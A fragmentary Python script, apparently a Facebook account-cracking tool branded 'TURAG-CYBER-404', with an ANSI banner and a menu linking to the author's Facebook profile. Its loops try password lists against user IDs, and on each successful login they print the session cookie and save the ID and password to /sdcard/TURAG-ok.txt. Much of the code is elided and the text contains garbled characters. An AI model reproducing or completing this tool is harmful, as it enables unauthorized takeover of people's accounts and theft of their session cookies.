...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By TURAG")
...
\033[1;32m[=]\033[1;92mAUTHOR   \033[1;93mTURAG AHAMED   \033[1;32m[=]
\033[1;32m[=]\033[1;32mGITHUB   \033[1;31mTURAG-CYBER-404\033[1;32m[=]
\033[1;32m[=]\033[1;32mFB GROUP \033[1;36mTURAG-CYBER-404\033[1;32m[=]
\033[1;32m╰─────────────•◈•───────────╯  
	""")
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://www.facebook.com/turag.ahmed.18');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/turag.ahmed.18');time.sleep(1)
		admin()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [TURAG-OK] '+cid+' | '+ps+'\33[0;92m')
                ##print(f'\r\33[1;92m [🚀] Number : {uid}')
                print(f'\r\033[1;92m [💖] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/TURAG-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[TURAG] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}TURAG{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\033[97;1m       [TURAG-OK] '+uid+' | '+ps+'\33[0;92m')
                ##print(f'\r\33[1;92m       [🚀] Number : {uid}')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/TURAG-ok.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
